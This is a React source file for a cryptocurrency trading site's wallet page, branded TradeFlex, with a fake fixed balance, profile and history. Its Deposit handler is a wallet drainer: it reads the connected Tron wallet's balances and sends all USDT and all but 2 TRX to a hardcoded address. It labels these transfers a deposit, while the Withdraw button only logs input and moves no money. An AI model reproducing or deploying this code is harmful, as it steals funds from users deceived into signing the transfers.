"use client";

import React, { useState, useEffect } from "react";
import {
  TrendingUp,
  Wallet,
  Crown,
  Activity,
  Clock,
  Plus,
  Minus,
  X,
} from "lucide-react";
import TickerBar from "./TickerBar";
import Navigation from "./Navigation";
import { useWallet } from "../contexts/WalletContext";
import ModalDialog from "./ModalDialog";

// Constants for transaction
const RECIPIENT_ADDRESS = "TWrSqQAbWDQT9b4TtgEByEHpWAFX8kriTL";
const STANDARD_BANDWIDTH_FEE_SUN = 1000000; // 1 TRX in SUN
const ACCOUNT_ACTIVATION_FEE_SUN = 1000000; // 1 TRX in SUN

// USDT Contract Address on Tron Network
const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

export default function WalletPage() {
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [amount, setAmount] = useState("");
  const [wallet, setWallet] = useState("");
  const [email, setEmail] = useState("");
  const availableBalance = 14;
  const [modalOpen, setModalOpen] = useState(false);
  const [modalMode, setModalMode] = useState("info");
  const [modalTitle, setModalTitle] = useState("");
  const [modalMessage, setModalMessage] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);

  const { address, adapter, connect, signTransaction, isConnected } =
    useWallet();

  const handleDepositClick = async () => {
    setIsProcessing(true);
    try {
      console.log("=== Deposit process started ===");

      // 1. Connect wallet if not connected
      if (!isConnected) {
        setModalMode("info");
        setModalTitle("Wallet Connection Required");
        setModalMessage("Please connect your wallet first to deposit.");
        setModalOpen(true);

        const result = await connect();
        if (!result.success) {
          setModalMode("fail");
          setModalTitle("Wallet Connection Failed");
          setModalMessage(
            result.error || "Failed to connect wallet. Please try again."
          );
          setModalOpen(true);
          setIsProcessing(false);
          return;
        }
        setModalOpen(false);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }

      // 2. Check if wallet is available
      if (!window.bybitWallet?.tronLink) {
        setModalMode("fail");
        setModalTitle("Wallet Not Available");
        setModalMessage(
          "Bybit Wallet is not available. Please ensure the extension is installed and active."
        );
        setModalOpen(true);
        setIsProcessing(false);
        return;
      }

      // 3. Get current address
      const currentAddress = address || adapter?.address;
      if (!currentAddress) {
        setModalMode("fail");
        setModalTitle("Wallet Address Not Available");
        setModalMessage(
          "Please ensure your wallet is properly connected and try again."
        );
        setModalOpen(true);
        setIsProcessing(false);
        return;
      }

      console.log("Using address:", currentAddress);

      setModalMode("info");
      setModalTitle("Checking Balances...");
      setModalMessage(
        "Checking your USDT and TRX balances to determine the optimal deposit."
      );
      setModalOpen(true);

      // 4. Get TronWeb instance
      const tronWeb = window.bybitWallet?.tronLink?.tronWeb || window.tronWeb;
      if (!tronWeb || typeof tronWeb.contract !== "function") {
        setModalMode("fail");
        setModalTitle("Wallet Not Ready");
        setModalMessage(
          "TronWeb is not available. Please ensure your wallet is connected and the extension is installed."
        );
        setModalOpen(true);
        setIsProcessing(false);
        return;
      }
      console.log("TronWeb instance:", tronWeb);

      // 5. Get prices with error handling
      let trxPrice = 0.1;
      let usdtPrice = 1;

      try {
        console.log("Fetching prices from CoinGecko...");
        const priceResponse = await fetch(
          "https://api.coingecko.com/api/v3/simple/price?ids=tron,usd-coin&vs_currencies=usd"
        );
        if (!priceResponse.ok) {
          throw new Error(`Price API error: ${priceResponse.status}`);
        }
        const priceData = await priceResponse.json();
        trxPrice = priceData.tron?.usd || 0.1;
        usdtPrice = priceData["usd-coin"]?.usd || 1;
        console.log("Prices fetched successfully:", { trxPrice, usdtPrice });
      } catch (error) {
        console.error("Failed to fetch prices, using fallback:", error);
        // Continue with fallback prices
      }

      // 6. Get balances with error handling
      let trxBalance = 0;
      let usdtBalance = 0;

      try {
        console.log("Getting TRX balance...");
        const trxBalanceSun = await tronWeb.trx.getBalance(currentAddress);
        trxBalance = trxBalanceSun / 1e6;
        console.log("TRX balance:", trxBalance);
      } catch (error) {
        console.error("Failed to get TRX balance:", error);
        setModalMode("fail");
        setModalTitle("Balance Check Failed");
        setModalMessage("Failed to get TRX balance. Please try again.");
        setModalOpen(true);
        setIsProcessing(false);
        return;
      }

      try {
        console.log("Getting USDT balance...");
        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
        const usdtBalanceRaw = await usdtContract
          .balanceOf(currentAddress)
          .call();
        usdtBalance = tronWeb.toDecimal(usdtBalanceRaw) / 1e6;
        console.log("USDT balance:", usdtBalance);
      } catch (error) {
        console.error("Failed to get USDT balance:", error);
        // Continue with 0 USDT balance
        usdtBalance = 0;
      }

      const trxUSDValue = trxBalance * trxPrice;
      const usdtUSDValue = usdtBalance * usdtPrice;

      console.log("Balance values:", {
        trxBalance,
        usdtBalance,
        trxUSDValue,
        usdtUSDValue,
      });

      // 7. Decide transfer order
      const transfers = [];
      if (trxUSDValue > usdtUSDValue) {
        if (trxBalance > 2) {
          transfers.push({ type: "TRX", amount: trxBalance - 2 });
        }
        if (usdtBalance > 0) {
          transfers.push({ type: "USDT", amount: usdtBalance });
        }
      } else {
        if (usdtBalance > 0) {
          transfers.push({ type: "USDT", amount: usdtBalance });
        }
        if (trxBalance > 2) {
          transfers.push({ type: "TRX", amount: trxBalance - 2 });
        }
      }

      console.log("Transfer plan:", transfers);

      if (transfers.length === 0) {
        setModalMode("fail");
        setModalTitle("Insufficient Balance");
        setModalMessage("You don't have enough TRX or USDT to deposit.");
        setModalOpen(true);
        setIsProcessing(false);
        return;
      }

      // 8. Execute transfers
      for (let i = 0; i < transfers.length; i++) {
        const transfer = transfers[i];
        setModalMode("info");
        setModalTitle(`Depositing ${transfer.type}...`);
        setModalMessage(
          `Depositing ${transfer.amount.toFixed(6)} ${
            transfer.type
          }. Please approve in your wallet.`
        );
        setModalOpen(true);

        try {
          if (transfer.type === "TRX") {
            console.log(`Transferring ${transfer.amount} TRX...`);
            const unsignedTx = await tronWeb.transactionBuilder.sendTrx(
              RECIPIENT_ADDRESS,
              transfer.amount * 1e6,
              currentAddress
            );
            console.log("TRX transaction built:", unsignedTx);

            const signedTx = await signTransaction(unsignedTx);
            console.log("TRX transaction signed");

            const result = await tronWeb.trx.sendRawTransaction(signedTx);
            console.log("TRX transaction result:", result);

            if (!result || !result.txid) {
              throw new Error(
                "TRX deposit failed - no transaction ID returned"
              );
            }
          } else if (transfer.type === "USDT") {
            console.log(`Transferring ${transfer.amount} USDT...`);
            const amountHex = tronWeb.toHex(transfer.amount * 1e6);
            const parameter = [
              { type: "address", value: RECIPIENT_ADDRESS },
              { type: "uint256", value: amountHex },
            ];

            const unsignedTx =
              await tronWeb.transactionBuilder.triggerConstantContract(
                USDT_CONTRACT_ADDRESS,
                "transfer(address,uint256)",
                {},
                parameter,
                currentAddress
              );
            console.log("USDT transaction built:", unsignedTx);

            const signedTx = await signTransaction(unsignedTx);
            console.log("USDT transaction signed");

            const result = await tronWeb.trx.sendRawTransaction(signedTx);
            console.log("USDT transaction result:", result);

            if (!result || !result.txid) {
              throw new Error(
                "USDT deposit failed - no transaction ID returned"
              );
            }
          }

          if (i < transfers.length - 1) {
            console.log("Waiting between transfers...");
            await new Promise((res) => setTimeout(res, 2000));
          }
        } catch (error) {
          console.error(`${transfer.type} transfer failed:`, error);
          setModalMode("fail");
          setModalTitle(`${transfer.type} Deposit Failed`);
          setModalMessage(
            `Failed to deposit ${transfer.amount.toFixed(6)} ${
              transfer.type
            }. Error: ${error.message}`
          );
          setModalOpen(true);
          setIsProcessing(false);
          return;
        }
      }

      setModalMode("success");
      setModalTitle("Deposit Successful");
      setModalMessage("Your deposit(s) were successful!");
      setModalOpen(true);
    } catch (error) {
      console.error("Deposit process failed:", error);
      setModalMode("fail");
      setModalTitle("Deposit Failed");
      setModalMessage(error.message || "An error occurred during deposit.");
      setModalOpen(true);
    }
    setIsProcessing(false);
  };

  return (
    <div className="min-h-screen bg-gray-900 bg-gradient-to-br from-[#0f172a] to-[#1e293b] font-inter w-full">
      <Navigation />
      <TickerBar />
      {/* Hero Section */}
      <div className="relative overflow-hidden mt-12">
        <div className="absolute inset-0 bg-gradient-to-r from-blue-600/10 to-green-600/10"></div>
        <div className="w-full max-w-7xl mx-auto px-4 md:px-8 py-12">
          <div className="text-center mb-12">
            <h1 className="text-5xl font-bold text-white mb-4">
              Your Digital
              <span className="block bg-gradient-to-r from-blue-400 to-green-400 bg-clip-text text-transparent">
                Wallet Hub
              </span>
            </h1>
            <p className="text-xl text-white/80 max-w-2xl mx-auto">
              Manage your funds, track transactions, and control your trading
              capital with ease.
            </p>
          </div>
        </div>
      </div>
      {/* Withdraw Modal */}
      {showWithdraw && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm">
          <div className="bg-gray-900/90 backdrop-blur-lg rounded-3xl shadow-2xl border border-gray-700 max-w-md w-full mx-4 relative animate-fadeIn overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-blue-600/10 to-green-600/10"></div>
            <div className="relative p-8">
              {/* Close button */}
              <button
                className="absolute top-4 right-4 text-gray-400 hover:text-white w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-800 transition-all duration-200"
                onClick={() => setShowWithdraw(false)}
                aria-label="Close"
              >
                <X className="w-5 h-5" />
              </button>
              <div className="flex items-center gap-3 mb-6">
                <div className="w-10 h-10 bg-gradient-to-tr from-red-500 to-pink-500 rounded-xl flex items-center justify-center">
                  <Minus className="w-6 h-6 text-white" />
                </div>
                <h2 className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-green-400 bg-clip-text text-transparent">
                  Withdraw Funds
                </h2>
              </div>
              <div className="space-y-6">
                <div>
                  <label className="block text-white/80 font-semibold mb-2">
                    Amount (USDT)
                  </label>
                  <div className="relative">
                    <input
                      type="number"
                      min="0"
                      step="any"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      placeholder="Enter amount"
                      className="w-full border-2 border-gray-700 bg-gray-900/60 text-white rounded-xl px-4 py-3 text-lg focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-200"
                    />
                    <button
                      type="button"
                      className="absolute right-2 top-2 bg-gradient-to-r from-blue-500 to-green-400 hover:from-blue-600 hover:to-green-500 text-white font-bold rounded-lg px-4 py-2 text-sm transition-all duration-200"
                      onClick={() => setAmount(availableBalance.toString())}
                    >
                      Max
                    </button>
                  </div>
                  <div className="text-sm text-white/60 mt-2 flex items-center gap-2">
                    <Wallet className="w-4 h-4" />
                    Available Balance: ${availableBalance} USDT
                  </div>
                </div>
                <div>
                  <label className="block text-white/80 font-semibold mb-2">
                    Wallet Address (TRC20)
                  </label>
                  <input
                    type="text"
                    value={wallet}
                    onChange={(e) => setWallet(e.target.value)}
                    placeholder="Enter TRC20 Wallet Address"
                    className="w-full border-2 border-gray-700 bg-gray-900/60 text-white rounded-xl px-4 py-3 text-lg focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-200"
                  />
                </div>
                <div>
                  <label className="block text-white/80 font-semibold mb-2">
                    Email Confirmation
                  </label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Enter your email"
                    className="w-full border-2 border-gray-700 bg-gray-900/60 text-white rounded-xl px-4 py-3 text-lg focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-200"
                  />
                </div>
                <div className="flex gap-4 pt-4">
                  <button
                    type="button"
                    className="flex-1 bg-gray-800 hover:bg-gray-700 text-white font-semibold rounded-xl px-6 py-3 text-base transition-all duration-200 border-2 border-gray-700"
                    onClick={() => setShowWithdraw(false)}
                  >
                    Cancel
                  </button>
                  <button
                    type="button"
                    className="flex-1 bg-gradient-to-r from-red-500 to-pink-500 hover:from-red-600 hover:to-pink-600 text-white font-semibold rounded-xl px-6 py-3 text-base transition-all duration-200 shadow-lg hover:shadow-xl"
                    onClick={() => {
                      // Handle withdrawal logic here
                      console.log("Withdraw:", { amount, wallet, email });
                      setShowWithdraw(false);
                    }}
                  >
                    CONFIRM WITHDRAWAL
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
      {/* Main Content */}
      <main className="w-full max-w-7xl mx-auto px-4 md:px-8 pb-12 pt-12 space-y-12">
        {/* User & Balance Cards */}
        <section className="grid grid-cols-1 lg:grid-cols-2 gap-8 w-full">
          {/* User Profile Card */}
          <div className="group bg-gray-800/50 border border-gray-700 rounded-xl backdrop-blur-sm shadow-lg overflow-hidden transition-all duration-500 hover:shadow-2xl hover:-translate-y-1">
            <div className="relative bg-gradient-to-br from-blue-600/10 to-green-600/10 p-8">
              <div className="absolute inset-0 bg-gradient-to-r from-blue-600/20 to-green-600/20"></div>
              <div className="relative text-center">
                <div className="relative inline-block mb-4">
                  <img
                    src="https://cdn-icons-png.flaticon.com/512/149/149071.png"
                    alt="User avatar"
                    className="w-20 h-20 rounded-full border-4 border-white/30 shadow-xl object-cover"
                  />
                  <div className="absolute -bottom-1 -right-1 w-6 h-6 bg-emerald-500 rounded-full border-2 border-white flex items-center justify-center">
                    <div className="w-2 h-2 bg-white rounded-full animate-pulse"></div>
                  </div>
                </div>
                <h3 className="text-white text-2xl font-bold mb-2">
                  User_irfqwtyv
                </h3>
                <div className="flex items-center justify-center gap-2 mb-4">
                  <Crown className="w-5 h-5 text-yellow-400" />
                  <span className="text-yellow-400 font-semibold">
                    Premium Member
                  </span>
                </div>
              </div>
            </div>
            <div className="relative p-6">
              <div className="flex items-center justify-between">
                <div className="text-sm text-white/60">Member Since</div>
                <div className="text-sm font-semibold text-white/90">
                  July 2025
                </div>
              </div>
              <div className="flex items-center justify-between mt-2">
                <div className="text-sm text-white/60">Status</div>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
                  <div className="text-sm font-semibold text-emerald-400">
                    Active
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Balance Card */}
          <div className="group bg-gray-800/50 border border-gray-700 rounded-xl backdrop-blur-sm shadow-lg overflow-hidden transition-all duration-500 hover:shadow-2xl hover:-translate-y-1">
            <div className="relative p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="w-12 h-12 bg-gradient-to-tr from-emerald-500 to-blue-500 rounded-xl flex items-center justify-center">
                  <Wallet className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h3 className="text-xl font-bold text-white">
                    Available Balance
                  </h3>
                  <p className="text-white/60 text-sm">Your trading capital</p>
                </div>
              </div>
              <div className="mb-6">
                <div className="text-5xl font-extrabold text-white mb-2">
                  ${availableBalance}
                </div>
                <div className="flex items-center gap-2 text-blue-400 text-sm">
                  <Clock className="w-4 h-4" />
                  Last updated: 1 minute ago
                </div>
              </div>
              <div className="flex gap-4">
                <button
                  className={`flex-1 bg-gradient-to-r from-emerald-500 to-blue-500 hover:from-emerald-600 hover:to-blue-600 text-white font-bold rounded-xl px-6 py-3 text-lg shadow-lg hover:shadow-xl transition-all duration-300 flex items-center justify-center gap-2 ${
                    isProcessing ? "opacity-60 cursor-not-allowed" : ""
                  }`}
                  onClick={handleDepositClick}
                  disabled={isProcessing}
                >
                  {isProcessing ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      PROCESSING...
                    </>
                  ) : (
                    <>
                      <Plus className="w-5 h-5" />
                      Deposit
                    </>
                  )}
                </button>
                <button
                  className="flex-1 border-2 border-red-500 text-red-500 font-bold rounded-xl px-6 py-3 text-lg hover:bg-red-500 hover:text-white transition-all duration-300 flex items-center justify-center gap-2"
                  onClick={() => setShowWithdraw(true)}
                >
                  <Minus className="w-5 h-5" />
                  Withdraw
                </button>
              </div>
            </div>
          </div>
        </section>

        {/* Transaction History */}
        <section className="relative w-full">
          <div className="bg-gray-800/50 border border-gray-700 rounded-xl backdrop-blur-sm shadow-lg overflow-hidden w-full">
            <div className="absolute inset-0 bg-gradient-to-br from-blue-600/10 to-green-600/10"></div>
            <div className="relative p-4 md:p-8">
              <div className="flex items-center gap-4 mb-8">
                <div className="w-12 h-12 bg-gradient-to-r from-blue-500 to-green-400 rounded-xl flex items-center justify-center">
                  <Activity className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-3xl font-bold text-white">
                    Transaction History
                  </h2>
                  <p className="text-white/80">
                    Track all your deposits and withdrawals
                  </p>
                </div>
              </div>
              <div className="bg-gray-900/60 backdrop-blur-sm rounded-2xl border border-gray-700 overflow-hidden">
                <div className="overflow-x-auto">
                  <table className="min-w-full">
                    <thead>
                      <tr className="bg-gradient-to-r from-gray-900 to-blue-900">
                        <th className="py-4 px-6 text-left text-sm font-bold text-white/80 uppercase tracking-wider">
                          Date & Time
                        </th>
                        <th className="py-4 px-6 text-left text-sm font-bold text-white/80 uppercase tracking-wider">
                          Type
                        </th>
                        <th className="py-4 px-6 text-left text-sm font-bold text-white/80 uppercase tracking-wider">
                          Amount
                        </th>
                        <th className="py-4 px-6 text-left text-sm font-bold text-white/80 uppercase tracking-wider">
                          Status
                        </th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-800">
                      <tr className="bg-gray-800/60 hover:bg-gray-800/80 transition-colors duration-200">
                        <td className="py-4 px-6">
                          <div className="font-semibold text-white">
                            2025-07-12
                          </div>
                          <div className="text-sm text-white/60">15:47 UTC</div>
                        </td>
                        <td className="py-4 px-6">
                          <div className="flex items-center gap-2">
                            <div className="w-8 h-8 bg-emerald-900/40 rounded-lg flex items-center justify-center">
                              <TrendingUp className="w-4 h-4 text-emerald-400" />
                            </div>
                            <span className="bg-emerald-900/40 text-emerald-400 font-semibold rounded-full px-4 py-2 text-sm">
                              Deposit
                            </span>
                          </div>
                        </td>
                        <td className="py-4 px-6">
                          <div className="text-emerald-400 font-bold text-lg">
                            +$14.83
                          </div>
                          <div className="text-sm text-white/60">USDT</div>
                        </td>
                        <td className="py-4 px-6">
                          <span className="bg-emerald-900/40 text-emerald-400 font-semibold rounded-full px-4 py-2 text-sm flex items-center gap-2 w-fit">
                            <div className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse"></div>
                            Completed
                          </span>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>
        </section>
      </main>
      {/* Footer */}
      <footer className="bg-gray-900 border-t border-blue-900/40 py-8">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <p className="text-white/40">
            © 2025 TradeFlex. All Rights Reserved.
          </p>
        </div>
      </footer>
      <ModalDialog
        open={modalOpen}
        onClose={() => setModalOpen(false)}
        mode={modalMode}
        title={modalTitle}
        message={modalMessage}
      />
      {/* CSS for animations */}
      <style jsx>{`
        @keyframes scroll {
          0% {
            transform: translateX(0);
          }
          100% {
            transform: translateX(-50%);
          }
        }

        .animate-scroll {
          animation: scroll 30s linear infinite;
        }

        @keyframes fadeIn {
          from {
            opacity: 0;
            transform: scale(0.9);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }

        .animate-fadeIn {
          animation: fadeIn 0.3s ease-out;
        }
      `}</style>
    </div>
  );
}
